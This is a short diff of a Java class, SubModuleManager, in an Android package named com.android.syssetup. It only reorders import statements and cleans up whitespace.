@@ -1,12 +1,12 @@
 package com.android.syssetup.module;
 
-import java.util.ArrayList;
-import java.util.List;
-
 import com.android.syssetup.ProcessInfo;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.evidence.Markup;
 import com.android.syssetup.util.Check;
+
+import java.util.ArrayList;
+import java.util.List;
 
 public class SubModuleManager {
 	private static final String TAG = "SubModuleManager";
@@ -94,7 +94,7 @@ public class SubModuleManager {
 						Check.log("Error: " + ex);
 					}
 				}
-				
+
 			}
 		}
 		return num;
